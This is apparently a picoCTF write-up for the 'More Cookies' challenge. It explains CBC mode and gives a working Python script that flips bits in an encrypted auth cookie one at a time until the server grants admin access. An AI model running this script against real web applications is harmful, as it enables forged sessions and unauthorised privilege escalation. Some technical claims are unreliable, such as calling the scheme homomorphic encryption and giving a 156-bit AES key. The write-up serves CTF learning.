More Cookies is a web exploitation challenge worth 90 points.
This challenge is practically hard regradless of the point value. It is about performing a CBC Bit Flipping attack against an homomorphic encryption in order to find the bit responsible of identifying admin users from normal users, flip that bit and gain access as admin to eventually get the flag.

## **Discovery**
***

* **We are presented with the following web page :**
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/3.png)

* **Since the challenge title refers to ```Cookies```, let's check if there are some :**

```shell
auth_name = L2M0a3lRaUd2bGNCcytsREhNTUNzSjhqQlQ3djljUCszeGl5RFlFdWlTQlc5b0c5ZW1IZzcvejZoeHBmeGNGOFpZRTdSUzFZMHR2eElhMnNXMi9IbHVBdTBVdE04T3hFbzZQcWlmQlVGQnZoWFhGVGRaWTQ2TnUzbVE4d1gxL0U= 
```

* **We have a cookie called ```auth_name``` which seems to be ```base64``` encoded.**
* **Let's ```base64``` decode it using ```Cyberchef``` :**
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/4.png)

* **As you can see, the result also seems to be ```base64``` encoded :**
* **Let's try decoding it one more time :**
![](https://github.com/zared1/zared1.github.io/blob/main/assets/Posts_img/CTFs/2/5.png?raw=true)

* **This time, we have some gibberish, unreadable piece of text.**
* **This indicates that the ```cookie``` was ```encrypted```, as per the challenge description, and ```base64``` encoded twice**

* **After taking a look af the first hint, which is a <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption" target="_blank"><er>Wikipedia link</er></a>, i realized that we are dealing with ```homomorphic encryption```.**

## **Homomorphic Encryption**
***
> ***As Per Wikipedia, <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption" target="_blank"><er>Homomorphic Encryption</er></a> is a form of encryption that permits users to perform computations on encrypted data without first decrypting it.***

***

* ***Basically, ```Homomorphic Encryption``` makes it possible to analyze and manipulate encrypted data without the need to decipher it and revealing private information.***
* ***To better understand the concept, let's take the example of a person asking the location of a specific restaurant from a third party service.***
* ***This person is actually revealing a huge volumes of data (His current location, the fact that he wants a restaurant, what time it is and more ...) with the service provider that's going to locate for him the requested restaurant.***
* ***However, if ```homomorphic encryption``` was applied in this example, none of the revealed informations would be visible to the service provider such as Google.***

***

* **With that being said, we need to find a way to manipulate the cookie without decrypting it in order to become an ```admin``` user.**
* **Another thing worth mentioning is that, if you take a closer look at the <a href="https://younestasra-r4z3rsw0rd.github.io/posts/MoreCookies/#description"><er>Challenge Description</er></a>, you will notice that the letters ```C```, ```B``` and ```C``` are strangely capitalized, which is an indication that ```CBC``` or ```Cipher Block Chaining``` is the encryption scheme used to encrypt the ```Cookie```.**

## **Back to Basics**
***
* **Before we can start tackling this problem, it’s worth revisiting how ```Cipher Block Chaining (CBC)``` works as we will need to understand how the algorithm operates in order to take on some advanced stuff.**
* **Let's start by defining some ```cryptographic algorithms``` :**s

### **AES**
* **AES, short for Advanced Encryption Standard, is a ```128-bit symmetric bloc cipher```, which means that it takes 128 bits of plaintext and encrypts it into 128 bits of ciphertext with a key that can either be ```128```, ```192``` or ```256``` bits.**
* **AES comes with plenty of different ```modes```, all labeled with a 3 letters names such as ```ECB``` (Electronic Code Book), ```CBC``` (Cipher Block Chaining), ```CTR``` (Counter) or ```CFB``` (Cipher Feedback) and more.**

***

### **Block Cipher**
* **A block cipher is a ```symmetric cryptographic algorithm``` that takes a plaintext block of length *n* and a key, and use that to generate a ciphertext block of the same length *n*.**
* **```AES``` is the most popular ```block cipher```, as i mentioned earlier it operates on ```128-bit blocks``` with keys of ```128```, ```192``` or ```156``` bits.**
* **The problem here is that, if you have a file of ```2GB``` and you are working with a ```128-bit``` block cipher (AES for example), the algorithm is certainly not going to encrypt this large file in a single call.** 
* **This is where ```modes of operation``` comes into play.**

***

### **ECB**
* **```ECB```, or ```Electronic Codebook```, is one of the solutions provided to overcome this problem.** 
* **The idea is to divide the data (plaintext) into multiple blocks and each block is encrypted separately using a block cipher algorithm with the same key.**
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/6.png)

* **The problem with ```ECB``` mode is that encrypting the same block of plaintext always yields the same block of ciphertext.**
* **This can allow the attacker to detect whether two ```ECB``` encrypted messages are identical, or share a common prefix or substrings.** 
* **Additionally, ```ECB mode``` is not ```semantically secure```, which means that observing ```ECB``` encrypted ciphertext can leak informations about the plaintext.**
* **Let's take for example the following graphical demonstration i found on Wikipedia, where the same image is encrypted using both ```ECB``` mode and a ```semantically secure``` cipher mode like ```CBC```:**
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/7.png)

***

### **CBC**

* **In ```CBC``` mode, each block of plaintext is <a href="https://en.wikipedia.org/wiki/XOR" target="_blank"><er>XORed</er></a> with the previous ciphertext block before being encrypted.**
* **In other words, ```CBC``` mode links the output of one block to the input of the next block, which essentially ```randomise``` the encryption and hence generate distinct ciphertexts even if the same plaintext is encrypted multiple times.**
* **For the first block, we use something called an ```Initialization Vector``` (IV), which is nothing more than a ```random array of bytes``` that has the same length of the blocks.**
<br/>
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/8.png)


***

* **```Decryption``` works by doing the process in ```reverse```.**
* **As you can see in the representation below, the first ciphertext block is decrypted using the decryption key *(which is the same key used for encryption since we are working with symmetric encryption)* and XORing the result with the ```Initialization Vector``` (IV), which gives us the first plaintext block.**
* **Now, moving to the next block, we decrypt the second ciphertext block and ```XOR``` the result with the previous ciphertext block which gives us the second plaintext block**
* **And So On ...**


![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/9.png)


## **Bit-Flipping Attack**

***

* **Now that we understand how ```CBC``` works, we can now talk about ```Bit-Flipping``` attack.**
* **The main vulnerable part of ```CBC``` is that, it relies on the previous ciphertext block in order to encrypt/decrypt the next plaintext/ciphertext block, and this is exactly where the ```Bit-Flipping``` attack comes into play.**
* **Let's see the visual representation of this attack in order to better understand how it works :**
![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/2/10.png)

* **As you can see, a <font color="Red">1-bit error</font> in the second ciphertext block :**
    * **Completely scambles the <font color="Red">plaintext block</font> which has the same index as the modified ciphertext;**
    * **AND Generates the same <font color="Red">1-bit error</font> in the next plaintext block (Third block).**

* **For example, in order to flip the <font color="Red">first bit</font> of the ```third plaintext block```, we need to flip the <font color="Red">first bit</font> of the ```second ciphertext block```.**

## **Exploitation**
***
* **Now that we have gone through the basics, let's try to solve the challenge.**
* **Since the challenge description highlights the use of ```AES-CBC mode``` to encrypt the ```auth_name``` cookie, we can assume that there is a ```bit```, within the encrypted cookie, responsible of identifying admin users from normal users.**
* **There is most likely a ```parameter``` like ```admin=0``` and if we modify the ```proper bit```, we can modify this parameter and set it to ```1```.**
<br/>

* **The problem is that the position of this particular bit is unkown, which means we need to try every single position and ```flip``` every single bit until the ```flag``` is shown.**
* **To do so, let's write a ```Python Script``` that will loop over all the bits in the ```cookie``` and flips each one until the ```flag``` is displayed.**

### **Writing the exploit**

* **First things first, let's :**
> 1. Establish a ```session object``` using the ```requests``` module;
> 2. Send a ```GET``` request;
> 3. Grab the ```auth_name``` cookie and store it in a ```Cookie``` variable;
> 4. ```Base64 decode``` twice the cookie. 

```python
#!/usr/bin/python3

import requests
from base64 import *

Target = "http://mercury.picoctf.net:34962/"   # CHANGE THIS

# Create a session object :
session = requests.Session()

# Make a GET request :
session.get(Target)

# Storing the auth_name cookie in our Cookie variable :
Cookie = session.cookies["auth_name"]

# Base64 decode twice :
Raw_Cookie = b64decode(b64decode(Cookie))

```

* **At this point, if we print out ```Cookie``` and ```Raw_Cookie```, we get the following :**

```shell
Cookie: MEZJZWc5UGdIeUZqdVNMNGx0WXBiYk42WDBWSThaUW9hcW5zYjEzN2I2ckgyZVpTbG1wenRVbVNDb1VreG4xNHJOMExEL2Q2NTY5aEZpNlRGMndLMUVOL3d4cmxRRkhUS2Y0QTcxaWJPSVlseGU1d2NjS1VQakZzZUNheU82Rmk=
Raw_Cookie: b'\xd0R\x1e\x83\xd3\xe0\x1f!c\xb9"\xf8\x96\xd6)m\xb3z_EH\xf1\x94(j\xa9\xeco]\xfbo\xaa\xc7\xd9\xe6R\x96js\xb5I\x92\n\x85$\xc6}x\xac\xdd\x0b\x0f\xf7z\xe7\xafa\x16.\x93\x17l\n\xd4C\x7f\xc3\x1a\xe5@Q\xd3)\xfe\x00\xefX\x9b8\x86%\xc5\xeepq\xc2\x94>1lx&\xb2;\xa1b'
```

* **Now, let's write the ```exploit``` where the ```Bit-Flipping``` process is going to take place.**
> 1. First, we define a ```loop``` to iterate over ```every single byte``` in the ```Raw_Cookie```;
> 2. Then, we define another nested ```loop``` to iterate over ```every single bit``` in the current byte of every iteration, given that every byte contains 8 bits ```(1-Byte = 8-bits)```;
> 3. Then, we take ```every byte of every iteration``` and ```xor``` it with ```another byte``` where all bits are set to ```zero``` except the bit at the position 'bit_index' which going to be set to ```one```;
> 4. ```Base64``` encode twice the generated cookie from the 3rd step;
> 5. Send a ```GET request``` with the new cookie; 
> 6. Checking if the flag is displayed in the response; 
>>  1. If  so, printing out the ```flag```, considering that the it is located between ```<code>``` and ```</code>``` HTML elements.
>>  2. Move on to the next byte and ```REPEAT```.

***

* **Here is what our first and basic script will look like :**

```python
#!/usr/bin/python3

import requests
from base64 import *

Target = "http://mercury.picoctf.net:34962/"        # CHANGE THIS

# Create a session object :
session = requests.Session()

# Make a GET request :
session.get(Target)

# Storing the auth_name cookie in our Cookie variable :
Cookie = session.cookies["auth_name"]

# Base64 decode twice :
Raw_Cookie = b64decode(b64decode(Cookie))

# Iterate over every single byte in the Raw_Cookie :
for byte_index in range(len(Raw_Cookie)) :

	# Iterate over every single bit in the current byte at the position "byte_index" => 1-Byte = 8-bits :
	for bit_index in range(0,8) :
		Potential_Raw_Cookie = Raw_Cookie[0:byte_index] + (Raw_Cookie[byte_index] ^ (1 << bit_index)).to_bytes(1, 'big') + Raw_Cookie[byte_index+1 :]
				
		# Base64 encode twice the Potential_Raw_Cookie to send out the Potential_Cookie in the same encoding scheme:
		Potential_Cookie = b64encode(b64encode(Potential_Raw_Cookie)).decode()	

		# Sending a GET request with the Potential_Cookie :
		r = requests.get(Target, cookies={"auth_name": Potential_Cookie})

		# Cheking if the response contains our flag format "picoCTF{" : 
		if ('picoCTF{' in r.text) :

			print("\n[*] HERE IS YOUR FLAG: " + r.text.split("<code>")[1].split("</code>")[0])
			exit()

# Clarification of the Potential_Raw_Cookie variable : +------------------------------------------------------------------------------------------+

		# Raw_Cookie[0:byte_index] 	 => All bytes before the current "byte_index", will not be engaged in the Bit-Flipping process, as they have already been tested.
		# Raw_Cookie[byte_index]   	 => This is the current byte where the Bit-Flipping is taking place.
		# 1 << bit_index           	 => This is the byte we created in order to xor it with the current byte, which is Raw_Cookie[byte_index]

			# if (bit_index == 0) then ( 1 << bit_index ) == 0000 0001 => 1
			# if (bit_index == 1) then ( 1 << bit_index ) == 0000 0010 => 2
			# if (bit_index == 2) then ( 1 << bit_index ) == 0000 0100 => 4
			# ...
			# if (bit_index == 7) then ( 1 << bit_index ) == 1000 0000 => 128
			
		# to_bytes(1, 'big')      	 => This will transfrom the XOR result into a raw format
		#            		  	 => For example, if the XOR result is 73 then to_bytes() will return b'\xe5'
		
		# Raw_Cookie[byte_index+1 :]	 => All bytes after the current "byte_index", will NOT YET be engaged in the Bit-Flipping process.	
#-------------------------------------------------------------------------------------------------------------------------------------------------+

```
* **The above script is very basic and simple, i wrote an improved and more verbose version, which walks you through the ```Bit-Flipping``` process and tells you where exactly it is taking place and makes you better understand the attack.** 
* **The entire process can be see in the clip below :**
